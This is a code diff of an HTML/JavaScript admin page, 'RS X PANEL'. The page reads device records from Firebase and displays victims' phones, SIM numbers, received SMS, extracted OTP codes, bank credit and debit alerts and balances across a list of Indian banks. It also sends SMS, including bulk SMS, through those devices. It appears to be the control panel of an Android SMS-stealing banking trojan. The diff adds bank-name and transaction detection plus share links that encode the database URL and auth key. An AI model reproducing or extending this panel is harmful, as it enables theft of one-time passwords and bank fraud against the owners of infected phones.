@@ -8,7 +8,6 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
     <style>
-        /* ─── RESET & VARIABLES ─────────────────────────────────────── */
         * {
             margin: 0;
             padding: 0;
@@ -101,7 +100,6 @@
             color: var(--green);
         }
 
-        /* ─── HOME SCREEN ─────────────────────────────────────────────── */
         .screen {
             min-height: 100vh;
             display: grid;
@@ -191,11 +189,14 @@
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
+            color: var(--cyan);
+            font-size: 13px;
         }
         .conn-item .info .date {
             color: var(--muted);
-            font-size: 12px;
+            font-size: 11px;
             margin-top: 2px;
+            word-break: break-all;
         }
         .conn-item button {
             width: 34px;
@@ -208,6 +209,7 @@
             place-items: center;
             font-size: 16px;
             transition: 0.15s;
+            flex-shrink: 0;
         }
         .conn-item button:hover {
             border-color: var(--muted);
@@ -227,6 +229,15 @@
         .conn-item .del:hover {
             border-color: var(--red);
             background: rgba(255, 77, 77, 0.08);
+        }
+        .conn-item .copy-link {
+            color: var(--gold);
+            border-color: rgba(246, 207, 69, 0.2);
+            font-size: 14px;
+        }
+        .conn-item .copy-link:hover {
+            border-color: var(--gold);
+            background: rgba(246, 207, 69, 0.08);
         }
 
         .btn-new {
@@ -253,7 +264,6 @@
             letter-spacing: 0.5px;
         }
 
-        /* ─── MODAL OVERLAY ───────────────────────────────────────────── */
         .modal-overlay {
             position: fixed;
             inset: 0;
@@ -397,7 +407,6 @@
             display: none;
         }
 
-        /* ─── DASHBOARD ────────────────────────────────────────────────── */
         .dashboard {
             display: none;
             min-height: 100vh;
@@ -435,13 +444,6 @@
             font-size: 12px;
             color: #fff;
             font-weight: 900;
-        }
-        .topbar .logo .dot svg {
-            width: 18px;
-            height: 18px;
-            fill: none;
-            stroke: #fff;
-            stroke-width: 2;
         }
         .topbar .search {
             flex: 1;
@@ -484,24 +486,6 @@
             min-width: 70px;
             text-align: center;
         }
-        .topbar .actions .telegram {
-            width: 38px;
-            height: 38px;
-            border-radius: 50%;
-            background: rgba(24, 191, 255, 0.06);
-            border: 1px solid rgba(24, 191, 255, 0.15);
-            display: grid;
-            place-items: center;
-            transition: 0.2s;
-        }
-        .topbar .actions .telegram:hover {
-            background: rgba(24, 191, 255, 0.12);
-            border-color: rgba(24, 191, 255, 0.3);
-        }
-        .topbar .actions .telegram svg {
-            width: 20px;
-            fill: #25bdf4;
-        }
         .topbar .actions .btn-icon {
             background: var(--bg2);
             border: 1px solid var(--border);
@@ -529,7 +513,6 @@
             color: var(--red);
         }
 
-        /* ─── STATS ROW ────────────────────────────────────────────────── */
         .statsbar {
             display: flex;
             gap: 28px;
@@ -618,7 +601,6 @@
             padding: 16px 26px 30px;
         }
 
-        /* ─── DEVICE CARD ──────────────────────────────────────────────── */
         .device-card {
             background: var(--bg2);
             border: 1px solid var(--border);
@@ -679,6 +661,24 @@
         .device-card .info .sub span {
             margin-right: 8px;
         }
+        .device-card .status-badge {
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 999px;
+            font-size: 10px;
+            font-weight: 700;
+            margin-top: 4px;
+        }
+        .device-card .status-badge.online {
+            background: rgba(0, 214, 143, 0.12);
+            color: var(--green);
+            border: 1px solid rgba(0, 214, 143, 0.2);
+        }
+        .device-card .status-badge.offline {
+            background: rgba(255, 77, 77, 0.08);
+            color: var(--red);
+            border: 1px solid rgba(255, 77, 77, 0.15);
+        }
         .device-card .balance {
             margin-top: 12px;
             padding: 8px 12px;
@@ -729,23 +729,6 @@
             color: var(--cyan);
             display: inline-block;
         }
-        .online-dot {
-            display: inline-block;
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            background: var(--green);
-            box-shadow: 0 0 10px var(--green);
-            margin-right: 6px;
-        }
-        .offline-dot {
-            display: inline-block;
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            background: var(--dim);
-            margin-right: 6px;
-        }
         .empty-grid {
             grid-column: 1 / -1;
             text-align: center;
@@ -773,7 +756,6 @@
             background: rgba(24, 191, 255, 0.15);
         }
 
-        /* ─── DETAIL MODAL TABS ───────────────────────────────────────── */
         .detail-tabs {
             display: flex;
             gap: 2px;
@@ -819,7 +801,6 @@
             display: block;
         }
 
-        /* Info tab */
         .detail-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -847,7 +828,6 @@
             word-break: break-word;
         }
 
-        /* Bank tab */
         .bank-summary {
             background: var(--bg3);
             border: 1px solid var(--border);
@@ -870,8 +850,12 @@
             font-size: 11px;
             text-transform: uppercase;
         }
+        .bank-summary .bank-name {
+            color: var(--gold);
+            font-weight: 700;
+            font-size: 14px;
+        }
 
-        /* SMS list */
         .sms-section h3 {
             color: var(--muted);
             font-size: 12px;
@@ -965,8 +949,33 @@
             border-radius: 4px;
             margin-top: 4px;
         }
+        .sms-item .tx-type {
+            display: inline-block;
+            font-size: 11px;
+            padding: 2px 10px;
+            border-radius: 4px;
+            margin-top: 4px;
+            font-weight: 600;
+        }
+        .sms-item .tx-type.credit {
+            background: rgba(0, 214, 143, 0.12);
+            color: var(--green);
+        }
+        .sms-item .tx-type.debit {
+            background: rgba(255, 77, 77, 0.12);
+            color: var(--red);
+        }
+        .sms-item .bank-name-tag {
+            display: inline-block;
+            background: rgba(246, 207, 69, 0.08);
+            color: var(--gold);
+            font-size: 11px;
+            padding: 2px 10px;
+            border-radius: 4px;
+            margin-top: 4px;
+            border: 1px solid rgba(246, 207, 69, 0.15);
+        }
 
-        /* Send tab */
         .send-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -1069,7 +1078,6 @@
             border: 1px solid rgba(255, 77, 77, 0.15);
         }
 
-        /* Bulk modal */
         .bulk-list {
             max-height: 200px;
             overflow-y: auto;
@@ -1096,7 +1104,6 @@
             cursor: pointer;
         }
 
-        /* ─── RESPONSIVE ──────────────────────────────────────────────── */
         @media (max-width: 900px) {
             .grid {
                 grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
@@ -1173,10 +1180,9 @@
 </head>
 <body>
 
-    <!-- ─── TOAST ──────────────────────────────────────────────────────── -->
     <div id="toast" class="toast"></div>
 
-    <!-- ─── HOME SCREEN ────────────────────────────────────────────────── -->
+    <!-- HOME SCREEN -->
     <section id="homeScreen" class="screen">
         <div class="shell">
             <div class="brand">
@@ -1194,21 +1200,21 @@
                 <div id="connectionsList"></div>
                 <button class="btn-new" id="newConnBtn">＋ New Account</button>
                 <div id="homeError" class="error-text hidden"></div>
+                <div style="margin-top:14px;text-align:center;font-size:12px;color:var(--dim)">
+                    <span>Share link: </span>
+                    <input id="shareLinkInput" style="background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:4px 10px;color:var(--text);font-size:12px;width:80%;margin-top:4px" readonly />
+                </div>
             </div>
             <div class="footer-text">RS X Admin Console · All connections are logged</div>
         </div>
     </section>
 
-    <!-- ─── NEW ACCOUNT MODAL ──────────────────────────────────────────── -->
+    <!-- NEW ACCOUNT MODAL -->
     <div class="modal-overlay" id="newAccountModal">
         <div class="modal-box" style="max-width:560px">
             <div class="modal-header">
                 <h2>New Firebase Account</h2>
                 <button class="close" id="closeAccountModal">&times;</button>
-            </div>
-            <div class="form-group">
-                <label>Label</label>
-                <input id="accLabel" placeholder="e.g. My Project" value="RS Project" />
             </div>
             <div class="form-group">
                 <label>Firebase Database URL</label>
@@ -1228,27 +1234,20 @@
             </div>
             <div id="setupError" class="error-text hidden"></div>
             <div class="form-actions">
-                <button class="primary" id="saveAccountBtn">⚡ Save &amp; Connect</button>
+                <button class="primary" id="saveAccountBtn">⚡ Save Account</button>
                 <button class="secondary" id="cancelAccountBtn">Cancel</button>
             </div>
         </div>
     </div>
 
-    <!-- ─── DASHBOARD ──────────────────────────────────────────────────── -->
+    <!-- DASHBOARD -->
     <section id="dashboardScreen" class="dashboard">
         <header class="topbar">
-            <div class="logo">
-                <div class="dot">RS</div>
-                RS X PANEL
-            </div>
+            <div class="logo"><div class="dot">RS</div> RS X PANEL</div>
             <div class="search"><input id="searchInput" placeholder="Search devices..." /></div>
             <div class="actions">
                 <span class="status" id="statusLabel">● Connected</span>
                 <span class="clock" id="clockDisplay">--:--:--</span>
-                <a class="telegram" href="https://t.me/RSPANNEL" target="_blank">
-                    <svg viewBox="0 0 24 24"><path d="M21.5 3.5 18.3 20c-.2 1.2-.9 1.5-1.8.9l-5-3.7-2.4 2.3c-.3.3-.5.5-1 .5l.4-5.1 9.3-8.4c.4-.4-.1-.6-.6-.2L5.7 13.7.8 12.2c-1.1-.3-1.1-1.1.2-1.6L20.2 4c.9-.3 1.7.2 1.3-.5z"/></svg>
-                </a>
-                <button class="btn-icon" id="refreshBtn" title="Refresh">↻</button>
                 <button class="btn-icon" id="bulkBtn" title="Bulk SMS">📨</button>
                 <button class="logout" id="logoutBtn">Exit</button>
             </div>
@@ -1278,7 +1277,7 @@
         </div>
     </section>
 
-    <!-- ─── DETAIL MODAL ────────────────────────────────────────────────── -->
+    <!-- DETAIL MODAL -->
     <div class="modal-overlay" id="detailModal">
         <div class="modal-box">
             <div class="modal-header">
@@ -1293,7 +1292,6 @@
                 <span style="color:var(--cyan)">📱 <span id="detailPhoneDisplay">—</span></span>
             </div>
 
-            <!-- Tabs -->
             <div class="detail-tabs">
                 <button class="tab-btn active" data-tab="info">Info</button>
                 <button class="tab-btn" data-tab="bank">Bank <span class="badge" id="bankTabBadge">0</span></button>
@@ -1301,7 +1299,6 @@
                 <button class="tab-btn" data-tab="send">Send</button>
             </div>
 
-            <!-- Tab: Info -->
             <div class="tab-content active" id="tabInfo">
                 <div class="detail-grid" id="detailGrid"></div>
                 <div style="margin-top:12px;padding:12px;background:var(--bg3);border-radius:12px;border:1px solid var(--border)">
@@ -1310,16 +1307,15 @@
                 </div>
             </div>
 
-            <!-- Tab: Bank -->
             <div class="tab-content" id="tabBank">
                 <div class="bank-summary">
                     <span class="label">Latest Balance</span>
                     <span class="balance" id="bankBalance">—</span>
+                    <span class="bank-name" id="bankNameDisplay">—</span>
                 </div>
                 <div id="bankMessageList"></div>
             </div>
 
-            <!-- Tab: SMS -->
             <div class="tab-content" id="tabSms">
                 <div class="sms-section">
                     <h3>📩 Messages <span class="count" id="smsCountLabel">(0)</span></h3>
@@ -1331,7 +1327,6 @@
                 </div>
             </div>
 
-            <!-- Tab: Send -->
             <div class="tab-content" id="tabSend">
                 <div class="send-grid">
                     <div class="full">
@@ -1361,7 +1356,7 @@
         </div>
     </div>
 
-    <!-- ─── BULK MODAL ──────────────────────────────────────────────────── -->
+    <!-- BULK MODAL -->
     <div class="modal-overlay" id="bulkModal">
         <div class="modal-box" style="max-width:600px">
             <div class="modal-header">
@@ -1385,7 +1380,7 @@
 
     <script>
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        //  CORE LOGIC — RS X PANEL (Firebase REST)
+        //  RS X PANEL — FULL FIREBASE MANAGEMENT
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
         // ─── STATE ──────────────────────────────────────────────────────────
@@ -1419,11 +1414,10 @@
         const bankStat = $('bankStat');
         const cardStat = $('cardStat');
         const clockDisplay = $('clockDisplay');
+        const shareLinkInput = $('shareLinkInput');
 
-        // Modals
         const newAccountModal = $('newAccountModal');
         const closeAccount = $('closeAccountModal');
-        const accLabel = $('accLabel');
         const accUrl = $('accUrl');
         const accKey = $('accKey');
         const apkFileInput = $('apkFileInput');
@@ -1443,6 +1437,7 @@
         const smsSearch = $('smsSearch');
         const sendDevicePhone = $('sendDevicePhone');
         const detailPhoneDisplay = $('detailPhoneDisplay');
+        const bankNameDisplay = $('bankNameDisplay');
 
         const bulkModal = $('bulkModal');
         const closeBulk = $('closeBulkModal');
@@ -1451,7 +1446,6 @@
         const bulkSendBtn = $('bulkSendBtn');
         const bulkResult = $('bulkResult');
 
-        // Tab elements
         const tabBtns = document.querySelectorAll('.tab-btn');
         const tabContents = {
             info: $('tabInfo'),
@@ -1460,13 +1454,60 @@
             send: $('tabSend')
         };
 
+        // ─── BANK NAMES DICTIONARY ────────────────────────────────────────
+        const BANK_NAMES = [
+            'Canara Bank', 'State Bank of India', 'SBI', 'HDFC Bank', 'ICICI Bank',
+            'Axis Bank', 'Kotak Mahindra Bank', 'Yes Bank', 'PNB', 'Punjab National Bank',
+            'Bank of Baroda', 'BOB', 'Union Bank', 'IDFC Bank', 'IndusInd Bank',
+            'RBL Bank', 'Bank of India', 'Central Bank', 'Indian Bank', 'UCO Bank',
+            'Bank of Maharashtra', 'Indian Overseas Bank', 'South Indian Bank',
+            'Federal Bank', 'Dhanlaxmi Bank', 'Karur Vysya Bank', 'Lakshmi Vilas Bank',
+            'Tamilnad Mercantile Bank', 'City Union Bank', 'Nainital Bank',
+            'Karnataka Bank', 'Saraswat Bank', 'Kalyan Janata Sahakari Bank',
+            'Shamrao Vithal Co-operative Bank', 'Citibank', 'Standard Chartered',
+            'HSBC', 'Deutsche Bank', 'ABN AMRO', 'Barclays', 'BNP Paribas'
+        ];
+
+        function detectBankName(text) {
+            const lower = text.toLowerCase();
+            for (const bank of BANK_NAMES) {
+                if (lower.includes(bank.toLowerCase())) {
+                    return bank;
+                }
+            }
+            // Common abbreviations
+            if (lower.includes('sbi')) return 'SBI';
+            if (lower.includes('hdfc')) return 'HDFC Bank';
+            if (lower.includes('icici')) return 'ICICI Bank';
+            if (lower.includes('axis')) return 'Axis Bank';
+            if (lower.includes('kotak')) return 'Kotak Mahindra Bank';
+            if (lower.includes('pnb')) return 'PNB';
+            if (lower.includes('bob')) return 'Bank of Baroda';
+            if (lower.includes('canara')) return 'Canara Bank';
+            if (lower.includes('union bank')) return 'Union Bank';
+            return null;
+        }
+
+        function detectTxType(text) {
+            const lower = text.toLowerCase();
+            if (lower.includes('credit') || lower.includes('credited') || lower.includes('received') ||
+                lower.includes('deposit') || lower.includes('added')) {
+                return 'credit';
+            }
+            if (lower.includes('debit') || lower.includes('debited') || lower.includes('withdraw') ||
+                lower.includes('deduct') || lower.includes('spent')) {
+                return 'debit';
+            }
+            return null;
+        }
+
         // ─── CLOCK ──────────────────────────────────────────────────────────
         function updateClock() {
             const now = new Date();
-            const hours = String(now.getHours()).padStart(2, '0');
-            const mins = String(now.getMinutes()).padStart(2, '0');
-            const secs = String(now.getSeconds()).padStart(2, '0');
-            clockDisplay.textContent = hours + ':' + mins + ':' + secs;
+            clockDisplay.textContent =
+                String(now.getHours()).padStart(2, '0') + ':' +
+                String(now.getMinutes()).padStart(2, '0') + ':' +
+                String(now.getSeconds()).padStart(2, '0');
         }
 
         function startClock() {
@@ -1484,21 +1525,82 @@
             el._hide = setTimeout(() => el.classList.remove('show'), 3000);
         }
 
+        // ─── ENCODE / DECODE FOR SHARE LINK ──────────────────────────────
+        function encodeFirebaseConn(url, key) {
+            // Format: URL|||KEY
+            const str = url + '|||' + (key || '');
+            return btoa(encodeURIComponent(str));
+        }
+
+        function decodeFirebaseConn(encoded) {
+            try {
+                const str = decodeURIComponent(atob(encoded));
+                const parts = str.split('|||');
+                return { url: parts[0] || '', key: parts[1] || '' };
+            } catch (e) {
+                return { url: '', key: '' };
+            }
+        }
+
+        function updateShareLink() {
+            if (!activeConn) {
+                shareLinkInput.value = '';
+                return;
+            }
+            const encoded = encodeFirebaseConn(activeConn.url, activeConn.key || '');
+            const link = window.location.origin + window.location.pathname + '?s=' + encoded;
+            shareLinkInput.value = link;
+        }
+
+        // ─── LOAD FROM URL ─────────────────────────────────────────────────
+        function loadFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            const s = params.get('s');
+            if (s) {
+                const decoded = decodeFirebaseConn(s);
+                if (decoded.url) {
+                    // Check if already in connections
+                    const existing = CONNECTIONS.find(c => c.url === decoded.url);
+                    if (!existing) {
+                        const conn = {
+                            label: decoded.url.replace(/https?:\/\//, '').substring(0, 20),
+                            url: decoded.url,
+                            key: decoded.key,
+                            date: new Date().toLocaleString()
+                        };
+                        CONNECTIONS.push(conn);
+                        localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
+                    }
+                    // Auto-connect
+                    const found = CONNECTIONS.find(c => c.url === decoded.url);
+                    if (found) {
+                        activeConn = found;
+                        renderConnections();
+                        showDashboard();
+                        toast('Auto‑connected from shared link', 'success');
+                        return true;
+                    }
+                }
+            }
+            return false;
+        }
+
         // ─── SCREEN NAVIGATION ────────────────────────────────────────────
         function showHome() {
             homeScreen.classList.remove('hidden');
             dashboardScreen.style.display = 'none';
             renderConnections();
             if (clockTimer) clearInterval(clockTimer);
-            // Stop polling if any
             if (pollTimer) clearInterval(pollTimer);
             pollTimer = null;
+            updateShareLink();
         }
 
         function showDashboard() {
             homeScreen.classList.add('hidden');
             dashboardScreen.style.display = 'block';
             startClock();
+            updateShareLink();
             refreshDevices();
             startPolling();
         }
@@ -1510,19 +1612,44 @@
                 connectionsList.innerHTML =
                     `<div style="color:var(--muted);padding:12px;text-align:center">No accounts saved.</div>`;
                 connCount.textContent = '0';
+                shareLinkInput.value = '';
                 return;
             }
             connCount.textContent = CONNECTIONS.length;
-            connectionsList.innerHTML = CONNECTIONS.map((c, i) => `
+            connectionsList.innerHTML = CONNECTIONS.map((c, i) => {
+                const encoded = encodeFirebaseConn(c.url, c.key || '');
+                const link = window.location.origin + window.location.pathname + '?s=' + encoded;
+                return `
                     <div class="conn-item">
                         <div class="info">
-                            <div class="name">${esc(c.label)}</div>
-                            <div class="date">${c.date || ''} · ${c.url ? c.url.substring(0, 30) + '…' : ''}</div>
+                            <div class="name">${esc(c.url.replace(/https?:\/\//, '').replace(/\.firebaseio\.com.*/, ''))}</div>
+                            <div class="date">${c.date || ''} · ${esc(c.url)}</div>
                         </div>
+                        <button class="copy-link" data-link="${link}" title="Copy share link">🔗</button>
                         <button class="connect" data-idx="${i}" title="Connect">▶</button>
                         <button class="del" data-idx="${i}" title="Delete">✕</button>
                     </div>
-                `).join('');
+                `;
+            }).join('');
+
+            connectionsList.querySelectorAll('.copy-link').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const link = btn.dataset.link;
+                    navigator.clipboard.writeText(link).then(() => {
+                        toast('Share link copied!', 'success');
+                    }).catch(() => {
+                        // Fallback
+                        const input = document.createElement('input');
+                        input.value = link;
+                        document.body.appendChild(input);
+                        input.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(input);
+                        toast('Share link copied!', 'success');
+                    });
+                });
+            });
+
             connectionsList.querySelectorAll('.connect').forEach(btn => {
                 btn.addEventListener('click', () => {
                     const idx = parseInt(btn.dataset.idx);
@@ -1530,14 +1657,15 @@
                     if (conn) {
                         activeConn = conn;
                         showDashboard();
-                        toast('Connected to ' + conn.label, 'success');
+                        toast('Connected to ' + conn.url.replace(/https?:\/\//, '').substring(0, 20), 'success');
                     }
                 });
             });
             connectionsList.querySelectorAll('.del').forEach(btn => {
                 btn.addEventListener('click', () => {
                     const idx = parseInt(btn.dataset.idx);
-                    if (confirm('Delete "' + CONNECTIONS[idx].label + '"?')) {
+                    const label = CONNECTIONS[idx].url.replace(/https?:\/\//, '').substring(0, 20);
+                    if (confirm('Delete "' + label + '"?')) {
                         CONNECTIONS.splice(idx, 1);
                         localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
                         renderConnections();
@@ -1549,17 +1677,23 @@
 
         // ─── FIREBASE HELPERS ─────────────────────────────────────────────
         function fbUrl(path) {
-            return activeConn.url + '/' + path + '.json' + (activeConn.key ? '?auth=' + activeConn.key : '');
+            const base = activeConn.url;
+            const auth = activeConn.key ? '?auth=' + activeConn.key : '';
+            // Remove trailing slash if present
+            const cleanUrl = base.replace(/\/+$/, '');
+            return cleanUrl + '/' + path + '.json' + auth;
         }
 
         async function fbGet(path) {
-            const res = await fetch(fbUrl(path));
+            const url = fbUrl(path);
+            const res = await fetch(url);
             if (!res.ok) throw new Error('HTTP ' + res.status);
             return res.json();
         }
 
         async function fbSet(path, data) {
-            const res = await fetch(fbUrl(path), {
+            const url = fbUrl(path);
+            const res = await fetch(url, {
                 method: 'PUT',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
@@ -1605,7 +1739,6 @@
                 const data = await fbGet('clients');
                 allDevices = parseDevices(data);
                 await loadAllMessages();
-                // Auto-detect phone numbers from SMS
                 autoDetectPhoneNumbers();
                 renderDeviceGrid();
                 updateStats();
@@ -1614,33 +1747,24 @@
             }
         }
 
-        // ─── AUTO DETECT PHONE NUMBERS FROM SMS ──────────────────────────
         function autoDetectPhoneNumbers() {
             for (const d of allDevices) {
                 const msgs = messageCache[d.id] || [];
                 let detectedNumber = null;
                 let detectedSims = [];
 
-                // Look for patterns in SMS messages
                 for (const msg of msgs) {
                     const text = msg.message;
-                    // Pattern: "plan expire" messages often contain number
                     if (text.toLowerCase().includes('plan expire') ||
                         text.toLowerCase().includes('plan expired') ||
                         text.toLowerCase().includes('main number') ||
                         text.toLowerCase().includes('mob no') ||
                         text.toLowerCase().includes('phone no')) {
-                        // Extract number: look for 10-digit or 12-digit with +91
                         const numMatch = text.match(/(\+91|0)?[6-9]\d{9}/);
-                        if (numMatch) {
-                            detectedNumber = numMatch[0];
-                            break;
-                        }
+                        if (numMatch) { detectedNumber = numMatch[0]; break; }
                     }
-                    // Look for common phone patterns
                     const numMatch = text.match(/(\+91|0)?[6-9]\d{9}/);
                     if (numMatch) {
-                        // Check if it looks like a phone number in context
                         const before = text.substring(0, text.indexOf(numMatch[0])).toLowerCase();
                         if (before.includes('no') || before.includes('number') || before.includes('mob') ||
                             before.includes('phone') || before.includes('sim') || before.includes('expire')) {
@@ -1650,7 +1774,6 @@
                     }
                 }
 
-                // Also check sims array
                 if (d.sims && d.sims.length > 0) {
                     for (const s of d.sims) {
                         if (s.phoneNumber) {
@@ -1659,21 +1782,13 @@
                     }
                 }
 
-                // If we found a number from SMS, update the device
                 if (detectedNumber && !d.phone) {
                     d.phone = detectedNumber;
-                    // Try to update in Firebase
-                    try {
-                        fbSet('clients/' + d.id + '/phone', detectedNumber);
-                    } catch (e) { /* ignore */ }
+                    try { fbSet('clients/' + d.id + '/phone', detectedNumber); } catch (e) {}
                 }
-
-                // Update sims from detected data
                 if (detectedSims.length > 0 && (!d.sims || d.sims.length === 0)) {
                     d.sims = detectedSims.map(s => ({ phoneNumber: s.phone, network: s.network || '' }));
-                    try {
-                        fbSet('clients/' + d.id + '/sims', d.sims);
-                    } catch (e) { /* ignore */ }
+                    try { fbSet('clients/' + d.id + '/sims', d.sims); } catch (e) {}
                 }
             }
         }
@@ -1703,12 +1818,19 @@
                     type: m.type || 'incoming',
                     otp: m.otp || ''
                 };
-            }).sort((a, b) => (a.dateTime > b.dateTime ? -1 : 1));
+            }).sort((a, b) => (a.dateTime > b.dateTime ? -1 : 1)); // NEWEST FIRST
         }
 
         function isBankSms(msg) {
             const text = msg.message.toLowerCase();
-            return /balance|bank|credit|debit|ac no|account|upi|received|rs\.|₹/.test(text);
+            // Only credit/debit/balance related
+            return /balance|bank|credit|debit|ac no|account|upi|received|rs\.|₹|withdraw|deposit|credited|debited/.test(
+            text);
+        }
+
+        function isCreditDebitSms(msg) {
+            const text = msg.message.toLowerCase();
+            return /credit|debit|credited|debited|withdraw|deposit|received|spent|paid/.test(text);
         }
 
         function extractBalance(msg) {
@@ -1725,14 +1847,23 @@
 
         function getDeviceBankSms(deviceId) {
             const msgs = messageCache[deviceId] || [];
-            return msgs.filter(m => isBankSms(m));
+            // Only credit/debit transactions + balance
+            return msgs.filter(m => isBankSms(m) && isCreditDebitSms(m));
         }
 
         function getLatestBalance(deviceId) {
             const bankMsgs = getDeviceBankSms(deviceId);
             if (!bankMsgs.length) return null;
-            const latest = bankMsgs[0];
-            return extractBalance(latest);
+            for (const m of bankMsgs) {
+                const bal = extractBalance(m);
+                if (bal) return bal;
+            }
+            return null;
+        }
+
+        function getBankNameFromMsg(msg) {
+            const text = msg.message;
+            return detectBankName(text) || null;
         }
 
         // ─── RENDER DEVICE GRID ───────────────────────────────────────────
@@ -1768,6 +1899,8 @@
                 const bankCount = bankMsgs.length;
                 const balance = getLatestBalance(d.id);
                 const phone = d.phone || '—';
+                const statusText = d.status ? 'Online' : 'Offline';
+                const statusClass = d.status ? 'online' : 'offline';
                 return `
                         <div class="device-card" data-id="${d.id}">
                             <div class="top">
@@ -1779,6 +1912,7 @@
                                         <span>🔋 ${d.battery || 0}%</span>
                                         <span>${esc(d.network || '')}</span>
                                     </div>
+                                    <div class="status-badge ${statusClass}">${statusText}</div>
                                     ${phone !== '—' ? `<div class="phone-display">📱 ${esc(phone)}</div>` : ''}
                                 </div>
                             </div>
@@ -1832,7 +1966,6 @@
         // ─── DETAIL MODAL ──────────────────────────────────────────────────
         async function openDetail(device) {
             selectedDevice = device;
-            // Update header
             $('detailDeviceName').textContent = device.id;
             $('detailStatus').textContent = device.status ? '● Online' : '○ Offline';
             $('detailStatus').style.color = device.status ? 'var(--green)' : 'var(--muted)';
@@ -1845,19 +1978,11 @@
             $('smsTabBadge').textContent = allMsgs.length;
             detailPhoneDisplay.textContent = device.phone || '—';
 
-            // Info tab
             renderInfoTab(device);
-
-            // SIMs
             renderSims(device);
-
-            // Bank tab
             renderBankTab(device);
-
-            // SMS tab
             renderSmsList(device.id, '');
 
-            // Send tab
             smsTo.value = device.phone || '';
             smsBody.value = '';
             sendResult.className = 'send-result';
@@ -1865,12 +1990,9 @@
             sendDevicePhone.textContent = device.phone || '—';
             updateSendBtnText();
 
-            // Set default active tab (info)
             switchTab('info');
-
             detailModal.classList.add('active');
 
-            // Start auto-refresh for messages while modal is open
             if (detailRefreshTimer) clearInterval(detailRefreshTimer);
             detailRefreshTimer = setInterval(() => {
                 if (selectedDevice && detailModal.classList.contains('active')) {
@@ -1878,17 +2000,14 @@
                         const activeTab = document.querySelector('.tab-btn.active');
                         if (activeTab) {
                             const tab = activeTab.dataset.tab;
-                            if (tab === 'sms') {
-                                renderSmsList(selectedDevice.id, smsSearch.value);
-                            } else if (tab === 'bank') {
-                                renderBankTab(selectedDevice);
-                            }
-                            const bankMsgs2 = getDeviceBankSms(selectedDevice.id);
-                            const allMsgs2 = messageCache[selectedDevice.id] || [];
-                            $('detailBankCount').textContent = bankMsgs2.length;
-                            $('detailSmsCount').textContent = allMsgs2.length;
-                            $('bankTabBadge').textContent = bankMsgs2.length;
-                            $('smsTabBadge').textContent = allMsgs2.length;
+                            if (tab === 'sms') renderSmsList(selectedDevice.id, smsSearch.value);
+                            else if (tab === 'bank') renderBankTab(selectedDevice);
+                            const bm = getDeviceBankSms(selectedDevice.id);
+                            const am = messageCache[selectedDevice.id] || [];
+                            $('detailBankCount').textContent = bm.length;
+                            $('detailSmsCount').textContent = am.length;
+                            $('bankTabBadge').textContent = bm.length;
+                            $('smsTabBadge').textContent = am.length;
                         }
                     });
                 }
@@ -1924,13 +2043,26 @@
             const balance = getLatestBalance(device.id);
             $('bankBalance').textContent = balance ? '₹' + esc(balance) : '—';
 
+            // Detect bank name from first bank message
+            let bankName = '—';
+            if (bankMsgs.length > 0) {
+                const detected = getBankNameFromMsg(bankMsgs[0]);
+                if (detected) bankName = detected;
+            }
+            bankNameDisplay.textContent = bankName;
+
             const container = $('bankMessageList');
             if (!bankMsgs.length) {
-                container.innerHTML = '<div style="color:var(--muted);padding:12px">No bank messages.</div>';
+                container.innerHTML = '<div style="color:var(--muted);padding:12px">No bank transactions.</div>';
                 return;
             }
             container.innerHTML = bankMsgs.slice(0, 50).map(m => {
                 const otp = extractOtp(m);
+                const txType = detectTxType(m.message);
+                const bank = getBankNameFromMsg(m);
+                const txLabel = txType === 'credit' ? '💰 Credit' :
+                    txType === 'debit' ? '💸 Debit' : '🏦 Bank';
+                const txClass = txType === 'credit' ? 'credit' : txType === 'debit' ? 'debit' : '';
                 return `
                         <div class="sms-item">
                             <div class="sms-header">
@@ -1939,7 +2071,8 @@
                             </div>
                             <div class="sms-body">${esc(m.message)}</div>
                             ${otp ? `<div class="sms-otp">🔐 OTP: ${otp}</div>` : ''}
-                            <div class="bank-tag">🏦 Bank SMS</div>
+                            ${bank ? `<div class="bank-name-tag">🏛️ ${esc(bank)}</div>` : ''}
+                            ${txType ? `<div class="tx-type ${txClass}">${txLabel}</div>` : ''}
                         </div>
                     `;
             }).join('');
@@ -1960,9 +2093,13 @@
             container.innerHTML = filtered.slice(0, 150).map(m => {
                 const otp = extractOtp(m);
                 const bank = isBankSms(m);
-                // Detect phone number in message
                 const numMatch = m.message.match(/(\+91|0)?[6-9]\d{9}/);
                 const hasPhone = numMatch ? true : false;
+                const txType = detectTxType(m.message);
+                const txClass = txType === 'credit' ? 'credit' : txType === 'debit' ? 'debit' : '';
+                const txLabel = txType === 'credit' ? '💰 Credit' :
+                    txType === 'debit' ? '💸 Debit' : '';
+                const bankName = getBankNameFromMsg(m);
                 return `
                         <div class="sms-item">
                             <div class="sms-header">
@@ -1972,13 +2109,14 @@
                             <div class="sms-body">${esc(m.message)}</div>
                             ${otp ? `<div class="sms-otp">🔐 OTP: ${otp}</div>` : ''}
                             ${bank ? `<div class="bank-tag">🏦 Bank</div>` : ''}
+                            ${bankName ? `<div class="bank-name-tag">🏛️ ${esc(bankName)}</div>` : ''}
+                            ${txType ? `<div class="tx-type ${txClass}">${txLabel}</div>` : ''}
                             ${hasPhone ? `<div class="phone-tag">📱 ${esc(numMatch[0])}</div>` : ''}
                         </div>
                     `;
             }).join('');
         }
 
-        // ─── LOAD MESSAGES FOR DEVICE ─────────────────────────────────────
